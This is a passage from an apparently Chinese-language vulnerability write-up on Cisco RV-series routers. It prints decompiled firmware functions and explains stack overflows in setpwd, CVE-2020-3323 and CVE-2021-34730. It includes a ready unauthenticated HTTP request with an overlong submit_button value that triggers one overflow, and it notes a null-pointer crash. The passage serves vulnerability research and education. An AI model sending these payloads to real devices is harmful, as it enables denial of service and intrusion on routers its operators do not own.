&#123;</span><br><span class="line">      logout(param_1);</span><br><span class="line">    &#125;</span><br><span class="line">    nvram_set(<span class="string">&quot;en_guest&quot;</span>,puVar4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    nvram_set(<span class="string">&quot;en_guest&quot;</span>,puVar4);</span><br><span class="line">    error_value = <span class="number">0xffffffff</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> error_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个功能是用于开启路由器的访客账户，开启之后访客也可以登录路由器进行一定的管理，有利于管理角色的分割。</p>
<p>第 56 行之前的代码多次使用 get_cgi 函数获取用户提交请求中的数据，第 58 行调用了 setpwd 函数设置访客用户的密码，其中第二个参数是 guest_name，即用户提交的访客用户名。</p>
<p>setpwd 函数的代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">uint <span class="title function_">setpwd</span><span class="params">(undefined4 param_1,undefined4 guest_name,<span class="type">char</span> *param_3,<span class="type">char</span> *param_4,undefined4param_5,</span></span><br><span class="line"><span class="params">           undefined4 param_6)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 local_128;</span><br><span class="line">  undefined4 local_124;</span><br><span class="line">  undefined4 local_120;</span><br><span class="line">  undefined4 local_11c;</span><br><span class="line">  undefined4 local_118;</span><br><span class="line">  undefined4 local_114;</span><br><span class="line">  undefined4 local_110;</span><br><span class="line">  undefined4 local_10c;</span><br><span class="line">  undefined4 local_108;</span><br><span class="line">  undefined4 local_104;</span><br><span class="line">  undefined4 local_100;</span><br><span class="line">  undefined4 local_fc;</span><br><span class="line">  undefined4 local_f8;</span><br><span class="line">  undefined4 local_f4;</span><br><span class="line">  undefined4 local_f0;</span><br><span class="line">  undefined2 local_ec;</span><br><span class="line">  <span class="type">char</span> acStack234 [<span class="number">202</span>];</span><br><span class="line">  </span><br><span class="line">  local_11c = <span class="number">0</span>;</span><br><span class="line">  local_118 = <span class="number">0</span>;</span><br><span class="line">  local_114 = <span class="number">0</span>;</span><br><span class="line">  local_110 = <span class="number">0</span>;</span><br><span class="line">  local_10c = <span class="number">0</span>;</span><br><span class="line">  local_108 = <span class="number">0</span>;</span><br><span class="line">  local_104 = <span class="number">0</span>;</span><br><span class="line">  local_100 = <span class="number">0</span>;</span><br><span class="line">  local_fc = <span class="number">0</span>;</span><br><span class="line">  local_f8 = <span class="number">0</span>;</span><br><span class="line">  local_f4 = <span class="number">0</span>;</span><br><span class="line">  local_f0 = <span class="number">0</span>;</span><br><span class="line">  local_ec = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(acStack234,<span class="number">0</span>,<span class="number">200</span>);</span><br><span class="line">  local_120 = <span class="number">0x585872</span>;</span><br><span class="line">  local_128 = <span class="number">0x70747468</span>;</span><br><span class="line">  local_124 = <span class="number">0x6573755f</span>;</span><br><span class="line">  <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;local_128,<span class="number">0xc</span>,<span class="string">&quot;http_user%d&quot;</span>,param_1);</span><br><span class="line">  iVar1 = <span class="built_in">strncmp</span>(param_3,<span class="string">&quot;enc=&quot;</span>,<span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">sscanf</span>(param_3,<span class="string">&quot;enc=%s&quot;</span>,&amp;local_11c);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(param_4,(<span class="type">char</span> *)&amp;local_11c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    md5_encode(param_3,&amp;local_11c);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(param_4,(<span class="type">char</span> *)&amp;local_11c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(acStack234,<span class="string">&quot;%s,enc=%s,%s&quot;</span>,param_6,param_5,guest_name);</span><br><span class="line">    nvram_set(&amp;local_128,acStack234);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (uint)(iVar1 != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以很明显的看到第 53 行使用 sprintf 函数将外部传入的参数拷贝到栈变量，其中最后一个参数就是我们关注的 guest_name 变量。(第五和第六个参数也可以导致溢出，不过选择最后一个参数可以减少干扰)</p>
<p>如果传入一个超长的字符串，则可以触发栈溢出，结合 ROP 等技术可以实现任意代码执行。(攻击分析见下文)</p>
<p><strong>另外，在函数 validate_guest_vlan 中也存在类似的问题，不过这些漏洞都属于后台漏洞，实际攻击中价值不是很大。</strong></p>
<h2 id="CVE-2020-3323"><a href="#CVE-2020-3323" class="headerlink" title="CVE-2020-3323"></a>CVE-2020-3323</h2><h3 id="基本信息-2"><a href="#基本信息-2" class="headerlink" title="基本信息"></a>基本信息</h3><p>官方发布信息： <a class="link"   href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX" >https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>漏洞评分：9.8(<strong>Critical</strong>)</p>
<p>漏洞描述：此漏洞位于 web 管理界面中，影响 Cisco RV110W，RV130 以及 RV215W 等设备。未经授权的攻击者可以通过构造特殊格式的 HTTP 请求，触发此漏洞，从而导致未授权的任意代码执行。</p>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此漏洞在 1.2.2.8 版本中进行了修复。</p>
<p>2020 年强网杯的 IoT 项目攻击目标之一就是 RV110W，现场应该有队伍利用了这个 nDay 完成了攻击。</p>
<p>此漏洞位于函数 guest_logout_cgi 中，Ghidra 反编译结果如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">undefined4 <span class="title function_">guest_logout_cgi</span><span class="params">(undefined4 param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> cVar1;</span><br><span class="line">  <span class="type">bool</span> bVar2;</span><br><span class="line">  <span class="type">int</span> cmac2;</span><br><span class="line">  <span class="type">char</span> *cmac;</span><br><span class="line">  <span class="type">size_t</span> cmac_len;</span><br><span class="line">  FILE *__stream;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  <span class="type">char</span> *cmac_end;</span><br><span class="line">  <span class="type">char</span> *maybe_vuln;</span><br><span class="line">  <span class="type">char</span> *local_c0;</span><br><span class="line">  undefined1 *local_bc;</span><br><span class="line">  <span class="type">char</span> *local_b8;</span><br><span class="line">  <span class="type">char</span> *local_b4;</span><br><span class="line">  undefined4 local_b0;</span><br><span class="line">  <span class="type">char</span> acStack172 [<span class="number">64</span>];</span><br><span class="line">  <span class="type">char</span> acStack108 [<span class="number">68</span>];</span><br><span class="line">  </span><br><span class="line">  cmac2 = get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">  cmac = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">  cmac_len = <span class="built_in">strlen</span>(cmac);</span><br><span class="line">  cmac_end = (<span class="type">char</span> *)(cmac2 + cmac_len + <span class="number">-1</span>);</span><br><span class="line">  cmac = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (cmac &lt; cmac_end) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      cVar1 = *cmac_end;</span><br><span class="line">      <span class="keyword">if</span> (((cVar1 != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp; (cVar1 != <span class="string">&#x27;\r&#x27;</span>)) &amp;&amp; (cVar1 != <span class="string">&#x27; &#x27;</span>)) <span class="keyword">break</span>;</span><br><span class="line">      *cmac_end = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      cmac_end = cmac_end + <span class="number">-1</span>;</span><br><span class="line">      cmac = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (cmac &lt; cmac_end);</span><br><span class="line">  &#125;</span><br><span class="line">  cmac = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">  cmac2 = get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">  cmac_end = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">  cmac_len = <span class="built_in">strlen</span>(cmac_end);</span><br><span class="line">  maybe_vuln = (<span class="type">char</span> *)(cmac2 + cmac_len + <span class="number">-1</span>);</span><br><span class="line">  cmac_end = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (cmac_end &lt; maybe_vuln) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      cVar1 = *maybe_vuln;</span><br><span class="line">      <span class="keyword">if</span> (((cVar1 != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp; (cVar1 != <span class="string">&#x27;\r&#x27;</span>)) &amp;&amp; (cVar1 != <span class="string">&#x27; &#x27;</span>)) <span class="keyword">break</span>;</span><br><span class="line">      *maybe_vuln = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      maybe_vuln = maybe_vuln + <span class="number">-1</span>;</span><br><span class="line">      cmac_end = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (cmac_end &lt; maybe_vuln);</span><br><span class="line">  &#125;</span><br><span class="line">  cmac_end = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">  maybe_vuln = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;submit_button&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (maybe_vuln == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    maybe_vuln = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (cmac == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (cmac_end == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(acStack108,<span class="number">0</span>,<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack172,<span class="number">0</span>,<span class="number">0x40</span>);</span><br><span class="line">  __stream = fopen(<span class="string">&quot;/dev/console&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__stream != (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(__stream,<span class="string">&quot;\n  mac=[%s], ip=[%s], submit_button=[%s]\n&quot;</span>,cmac,cmac_end,maybe_vuln);</span><br><span class="line">    fclose(__stream);</span><br><span class="line">  &#125;</span><br><span class="line">  cmac2 = VERIFY_MAC_17(cmac);</span><br><span class="line">  <span class="keyword">if</span> ((cmac2 == <span class="number">0</span>) || (cmac2 = VERIFY_IPv4(cmac_end), cmac2 == <span class="number">0</span>)) &#123;</span><br><span class="line">    __stream = fopen(<span class="string">&quot;/dev/console&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__stream == (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(__stream,<span class="string">&quot;\n%s(%d)  Drop session,VALID_FAIL, mac=[%s], ip=[%s],submit_button=[%s]\n&quot;</span>,</span><br><span class="line">            <span class="string">&quot;guest_logout_cgi&quot;</span>,<span class="number">0x1542</span>,cmac,cmac_end,maybe_vuln);</span><br><span class="line">    fclose(__stream);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __s1 = <span class="built_in">strstr</span>(maybe_vuln,<span class="string">&quot;status_guestnet.asp&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">LAB_00431d24:</span><br><span class="line">    __s1 = (<span class="type">char</span> *)nvram_get(<span class="string">&quot;http_client_mac&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (((__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (cmac2 = <span class="built_in">strcmp</span>(__s1,cmac), cmac2 == <span class="number">0</span>)) &amp;&amp;</span><br><span class="line">       ((__s1 = (<span class="type">char</span> *)nvram_get(<span class="string">&quot;http_client_ip&quot;</span>), __s1 == (<span class="type">char</span> *)<span class="number">0x0</span> ||</span><br><span class="line">        (cmac2 = <span class="built_in">strcmp</span>(__s1,cmac_end), cmac2 == <span class="number">0</span>)))) &#123;</span><br><span class="line">      bVar2 = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">goto</span> LAB_00431c68;</span><br><span class="line">    &#125;</span><br><span class="line">    __stream = fopen(<span class="string">&quot;/dev/console&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__stream != (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(__stream,</span><br><span class="line">              <span class="string">&quot;\n%s(%d)  Drop session, ip and mac invmatch,mac=[%s], ip=[%s],submit_button=[%s]\n&quot;</span>,</span><br><span class="line">              <span class="string">&quot;guest_logout_cgi&quot;</span>,<span class="number">0x1551</span>,cmac,cmac_end,maybe_vuln);</span><br><span class="line">      fclose(__stream);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">sscanf</span>(maybe_vuln,<span class="string">&quot;%[^;];%*[^=]=%[^\n]&quot;</span>,acStack108,acStack172);</span><br><span class="line">    __stream = fopen(<span class="string">&quot;/dev/console&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__stream != (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(__stream,<span class="string">&quot;\n%s(%d),submit_button = [%s] url=[%s], session_id=[%s]\n&quot;</span>,</span><br><span class="line">              <span class="string">&quot;guest_logout_cgi&quot;</span>,<span class="number">0x1549</span>,maybe_vuln,acStack108,acStack172);</span><br><span class="line">      fclose(__stream);</span><br><span class="line">    &#125;</span><br><span class="line">    __s1 = (<span class="type">char</span> *)nvram_get(<span class="string">&quot;session_key&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) <span class="keyword">goto</span> LAB_00431d24;</span><br><span class="line">    cmac2 = <span class="built_in">strcmp</span>(__s1,acStack172);</span><br><span class="line">    bVar2 = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (cmac2 != <span class="number">0</span>) <span class="keyword">goto</span> LAB_00431d24;</span><br><span class="line">LAB_00431c68:</span><br><span class="line">    syslog(<span class="number">6</span>,<span class="string">&quot;The mac is %s and IP is %s of guest network user logout.&quot;</span>,cmac,cmac_end);</span><br><span class="line">    <span class="keyword">if</span> ((debug != <span class="number">0</span>) &amp;&amp; (__stream = fopen(<span class="string">&quot;/dev/console&quot;</span>,<span class="string">&quot;w&quot;</span>), __stream != (FILE *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(__stream,<span class="string">&quot;%s(): \n  mac=[%s], ip=[%s],submit_button=[%s]\n&quot;</span>,<span class="string">&quot;guest_logout_cgi&quot;</span>,cmac,</span><br><span class="line">              cmac_end,maybe_vuln);</span><br><span class="line">      fclose(__stream);</span><br><span class="line">    &#125;</span><br><span class="line">    local_c0 = <span class="string">&quot;/sbin/cron_gn&quot;</span>;</span><br><span class="line">    local_bc = &amp;DAT_00485fe4;</span><br><span class="line">    local_b0 = <span class="number">0</span>;</span><br><span class="line">    local_b8 = cmac;</span><br><span class="line">    local_b4 = cmac_end;</span><br><span class="line">    _eval(&amp;local_c0,<span class="string">&quot;&gt;/dev/console&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ((bVar2) &amp;&amp; (cmac2 = <span class="built_in">strcmp</span>(acStack108,<span class="string">&quot;status_guestnet.asp&quot;</span>), cmac2 == <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">goto</span> LAB_00431de8;</span><br><span class="line">  &#125;</span><br><span class="line">  cmac2 = <span class="built_in">strcmp</span>(maybe_vuln,<span class="string">&quot;login_guest.asp&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (cmac2 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LAB_00431de8:</span><br><span class="line">  cmac_len = <span class="built_in">strlen</span>(acStack108);</span><br><span class="line">  <span class="keyword">if</span> (cmac_len &lt; <span class="number">6</span>) &#123;</span><br><span class="line">    do_ej(maybe_vuln,param_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    do_ej(acStack108,param_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>第 52 行使用 get_cgi 函数获取 submit_button 字段的内容，第 80 行使用 strstr 判断其中是否存在字符串 “status_guestnet.asp”，如果存在，则执行第 99 行的代码，使用 sscanf 将数据拷贝到两个栈变量中。</p>
<p>很明显这里存在栈溢出漏洞，如果用户构造一个包含 “status_guestnet.asp” 的超长字符串，就可以触发栈溢出漏洞，进而结合 ROP 等技术实现任意代码执行。(攻击分析见下文)</p>
<p>经过测试，这个函数对应的后台接口是 guest_logout.cgi，并且不需要身份验证，所以我们可以构造下面的数据包触发此漏洞。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /guest_logout.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 160</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https://192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: iframe</span><br><span class="line">Referer: https://192.168.1.1/config_user.asp;session_id=8ba902bb5765a3645d189cccb60f2259</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">cmac=00:01:02:03:04:05&amp;cip=192.168.1.1&amp;submit_button=status_guestnet.aspaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure></div>

<p><strong>注：在第 38 行尝试获取 cip 字段的内容，如果我们不提供这个字段，将返回 0，经验证会在 strlen 函数中导致空指针解引用，可以使 httpd 服务崩溃。</strong></p>
<h2 id="CVE-2021-34730"><a href="#CVE-2021-34730" class="headerlink" title="CVE-2021-34730"></a>CVE-2021-34730</h2><h3 id="基本信息-3"><a href="#基本信息-3" class="headerlink" title="基本信息"></a>基本信息</h3><p>官方发布信息： <a class="link"   href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cisco-sb-rv-overflow-htpymMB5" >Cisco Small Business RV110W, RV130, RV130W, and RV215W Routers Remote Command Execution and Denial of Service Vulnerability<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>漏洞评分：9.8(<strong>Critical</strong>)</p>
<p>漏洞描述：A vulnerability in the Universal Plug-and-Play (UPnP) service of Cisco Small Business RV110W, RV130, RV130W, and RV215W Routers could allow an unauthenticated, remote attacker to execute arbitrary code or cause an affected device to restart unexpectedly, resulting in a denial of service (DoS) condition.。</p>
<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此漏洞存在于解析 SSDP 协议的过程，位于函数 m_search_handler，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">m_search_handler</span><span class="params">(<span class="type">int</span> upnp_context)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">size_t</span> __n;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  <span class="type">char</span> *__s;</span><br><span class="line">  <span class="type">char</span> *pcVar3;</span><br><span class="line">  <span class="type">char</span> *maybe_vuln;</span><br><span class="line">  <span class="type">char</span> **ppcVar4;</span><br><span class="line">  <span class="type">int</span> *piVar5;</span><br><span class="line">  <span class="type">char</span> acStack168 [<span class="number">128</span>];</span><br><span class="line">  </span><br><span class="line">  ssdp_get_cur_ifp();</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">char</span> **)(upnp_context + <span class="number">0x39a0</span>) != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(upnp_context + <span class="number">0x39a0</span>),<span class="string">&quot;239.255.255.250:1900&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">char</span> **)(upnp_context + <span class="number">0x39a4</span>) != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(upnp_context + <span class="number">0x39a4</span>),<span class="string">&quot;\&quot;ssdp:discover\&quot;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (*(<span class="type">char</span> **)(upnp_context + <span class="number">0x39ac</span>) != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        iVar1 = atoi(*(<span class="type">char</span> **)(upnp_context + <span class="number">0x39ac</span>));</span><br><span class="line">        <span class="keyword">if</span> (iVar1 &lt; <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        maybe_vuln = *(<span class="type">char</span> **)(upnp_context + <span class="number">0x39a8</span>);</span><br><span class="line">        <span class="keyword">if</span> (maybe_vuln == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        iVar1 = <span class="built_in">strcmp</span>(maybe_vuln,<span class="string">&quot;ssdp:all&quot;</span>);</span><br><span class="line">        uVar2 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">          iVar1 = <span class="built_in">strcmp</span>(maybe_vuln,<span class="string">&quot;upnp:rootdevice&quot;</span>);</span><br><span class="line">          uVar2 = <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">            iVar1 = <span class="built_in">memcmp</span>(maybe_vuln,<span class="string">&quot;uuid:&quot;</span>,<span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">              piVar5 = *(<span class="type">int</span> **)(*(<span class="type">int</span> *)(upnp_context + <span class="number">0x50</span>) + <span class="number">0x2c</span>);</span><br><span class="line">              <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (piVar5 == (<span class="type">int</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ppcVar4 = *(<span class="type">char</span> ***)(piVar5[<span class="number">2</span>] + <span class="number">0xc</span>);</span><br><span class="line">                <span class="keyword">while</span> (__s = *ppcVar4, __s != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">                  __n = <span class="built_in">strlen</span>(__s);</span><br><span class="line">                  pcVar3 = ppcVar4[<span class="number">0xb</span>];</span><br><span class="line">                  ppcVar4 = ppcVar4 + <span class="number">0xc</span>;</span><br><span class="line">                  <span class="keyword">if</span> (pcVar3 != (<span class="type">char</span> *)<span class="number">0x2</span>) &#123;</span><br><span class="line">                    iVar1 = <span class="built_in">memcmp</span>(maybe_vuln,__s,__n);</span><br><span class="line">                    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">                      iVar1 = <span class="built_in">memcmp</span>(maybe_vuln + __n,<span class="string">&quot;:1&quot;</span>,<span class="number">2</span>);</span><br><span class="line">                      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">if</span> (pcVar3 == (<span class="type">char</span> *)<span class="number">0x1</span>) &#123;</span><br><span class="line">                        <span class="built_in">strncpy</span>(acStack168,maybe_vuln,__n);</span><br><span class="line">                        uVar2 = <span class="number">4</span>;</span><br><span class="line">                        acStack168[__n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                        <span class="keyword">goto</span> LAB_00405c94;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">if</span> ((pcVar3 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (pcVar3 == (<span class="type">char</span> *)<span class="number">0x3</span>)) &#123;</span><br><span class="line">                        <span class="built_in">strncpy</span>(acStack168,maybe_vuln,__n);</span><br><span class="line">                        uVar2 = <span class="number">5</span>;</span><br><span class="line">                        acStack168[__n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                        <span class="keyword">goto</span> LAB_00405c94;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                piVar5 = (<span class="type">int</span> *)*piVar5;</span><br><span class="line">              &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">            &#125;</span><br><span class="line">                    <span class="comment">/* 溢出 */</span></span><br><span class="line">            <span class="built_in">strcpy</span>(acStack168,maybe_vuln + <span class="number">5</span>);</span><br><span class="line">            uVar2 = <span class="number">3</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">LAB_00405c94:</span><br><span class="line">        ssdp_msearch_response(upnp_context,acStack168,uVar2);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>第 30 行代码从 upnp_context 结构体中获取了某个数据，通过对下面流程的分析可以确定这里获取的是 ST 字段，第 78 行代码引用了 strcpy 函数将内容直接拷贝到栈变量中，如果攻击者传入一个超长的字符串，将导致栈溢出。(攻击分析见下文)</p>
<h2 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h2><p>在具体分析之前，先设置好分析环境，拆开路由器之后在右上角可以找到 UART 串口，并且标记了接口名称，只需要焊接好排针就可以使用了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2020-3323-1.jpg"
                     
                ></p>
<p>接入 FT232 之后在电脑打开串口软件，设备启动完毕按回车拿到 shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2020-3323-2.png"
                     
                ></p>
